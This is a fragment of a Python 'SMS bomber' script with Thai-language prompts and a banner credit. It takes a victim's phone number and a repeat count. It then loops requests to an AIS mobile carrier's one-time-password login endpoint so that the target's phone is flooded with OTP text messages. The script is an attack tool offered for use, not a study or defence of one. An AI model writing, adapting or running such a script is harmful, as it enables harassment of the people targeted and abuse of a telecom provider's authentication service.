...
p = int(input(Fore.GREEN + "รหัสผ่าน000ไง: "))
if p < 000:
...
os.system("figlet smsall")
os.system("neofetch")
print ("FB:ohm jirawat")
numbers = input("> :")
num = int(input("จำนวนทีมึงจะยิง:"))
class SMS():
    def spamais(self,num):
        url = "https://srfng.ais.co.th/login/sendOneTimePW"
        data = f"msisdn={num}&serviceId=AISPlay&accountType=all&otpChannel=sms"
        ...
        init()
        print(Fore.YELLOW + " > " + Fore.RED + str(random.randint(1,100)))
t = SMS()
def loop(num):
    for i in range(num):
        t.spamais(numbers)
